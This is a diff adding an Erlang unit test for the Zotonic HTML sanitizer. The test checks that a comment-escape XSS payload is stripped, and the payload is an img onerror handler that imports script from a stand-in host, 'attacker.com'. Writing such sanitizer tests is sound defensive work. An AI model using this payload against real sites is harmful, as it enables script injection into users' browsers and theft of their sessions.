@@ -57,6 +57,15 @@ zmedia_test() ->
         <<"align">> := <<"block">>
     } = jsxrecord:decode(<<"{", JSON/binary, "}">>).
 
+comment_test() ->
+    Context = z_context:new(zotonic_site_testsandbox),
+    In = <<"<!--data-mce-selected=\"x\"->\"><img src onerror=import('//attacker.com')>-->">>,
+    Out = <<>>,
+    ?assertEqual(Out, z_sanitize:html(In, Context)),
+    In2 = <<"<!-- an innocent comment -->">>,
+    Out2 = In2,
+    ?assertEqual(Out2, z_sanitize:html(In2, Context)).
+
 csv_test() ->
     sanitize_csv(<<"1.0,2,3,\"4\",-1,-1+3\n">>, <<"\"1.0\",\"2\",\"3\",\"4\",\"-1\",\"'-1+3\"\r\n">>),
     sanitize_csv(<<"1.0;2;3;\"4\";-1;-1+3\n">>, <<"\"1.0\";\"2\";\"3\";\"4\";\"-1\";\"'-1+3\"\r\n">>),
